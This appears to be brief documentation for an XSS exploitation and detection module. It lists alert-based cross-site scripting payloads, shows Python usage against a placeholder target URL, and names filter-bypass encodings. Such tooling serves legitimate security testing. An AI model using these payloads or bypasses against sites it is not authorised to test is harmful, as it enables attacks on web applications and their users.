XSS Exploit Module

Description

Cross-Site Scripting (XSS) exploitation module with payload injection and detection.

Payloads

<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')
<body onload=alert('XSS')>

Usage

from exploits.xss_exploit import XSSExploit

xss = XSSExploit()
result = xss.execute("https://target.com/search?q=test")
if result["vulnerable"]:
    print(f"XSS found! Payload: {result['payloads'][0]}")

Bypass Techniques

The XSS module includes multiple bypass techniques:

  • URL encoding
  • Double encoding
  • HTML entity encoding
  • Case variations
  • Alternative syntax
  • Comment insertion
  • Junk character insertion
